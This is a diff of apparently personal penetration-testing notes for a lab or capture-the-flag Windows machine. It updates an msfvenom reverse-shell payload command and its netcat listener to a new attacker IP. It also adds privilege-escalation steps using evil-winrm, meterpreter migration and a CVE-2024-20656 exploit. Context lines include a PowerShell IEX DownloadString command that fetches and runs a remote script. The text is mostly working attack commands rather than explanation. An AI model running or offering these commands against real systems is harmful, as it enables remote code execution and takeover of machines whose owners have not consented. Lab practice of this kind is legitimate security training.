@@ -307,8 +307,9 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.64/Invoke-P
 https://github.com/charlesgargasson/CVE-2024-20656
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o payload.exe
-sudo nc -nvlp 443 -s 10.10.14.113
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.64 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o payload.exe
+
+sudo nc -nvlp 443 -s 10.10.15.64
 ```
 
 
@@ -322,7 +323,7 @@ $VSDiagnostics = get-item "C:\\*\\Microsoft Visual Studio\\*\\Community\\Team To
 c:\exploit\expl.exe $VSDiagnostics.FullName "c:\exploit\payload.exe"
 ```
 
-## Getting a VNC session
+## ~~Getting a VNC session~~
 
 use windows/local/payload_inject
 ![[Pasted image 20241011150111.png]]
@@ -332,5 +333,11 @@ use windows/local/payload_inject
 
 future reference on vnc stuff https://www.hackingarticles.in/vnc-penetration-testing/
 
+# Priv Esc Steps
+
 1. evil-winrm into box as emily
 2. start a meterpreter session
+3. Upgrade your meterpreter session
+4. migrate meterpreter session to explorer.exe
+5. Do all the things in "get the exploit"
+6. Start a netcat listener to catch the call from the payload
